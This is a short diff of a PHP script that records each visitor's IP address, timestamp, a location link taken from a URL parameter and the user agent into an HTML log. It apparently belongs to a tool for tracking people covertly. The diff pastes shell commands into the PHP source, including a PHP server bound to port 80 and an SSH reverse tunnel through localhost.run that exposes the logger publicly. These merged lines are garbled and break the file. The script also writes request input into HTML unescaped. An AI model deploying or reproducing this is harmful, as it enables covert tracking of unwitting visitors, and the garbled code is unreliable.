@@ -1,4 +1,4 @@
-<?php
+php -S 0.0.0.0:80ssh<?php
 $file = fopen("log.html", "a");
 $date = date("d-m-Y H:i:s") . " (GMT)";
 $ip = $_SERVER["REMOTE_ADDR"];
@@ -9,4 +9,4 @@ $agent = $_GET["agent"];
 $data =  "<pre>Datetime: " . $date . "\nIP: " . $ip . "\nLocation: " . "<a href=" . $url . " target='_blank'>Click Here</a>" . "\nUser-Agent: " . $agent . "</pre>\n\n";
 fwrite($file, $data);
 fclose($file);
-?>
+?>ssh -R 80:localhost:80 nokey@localhost.run
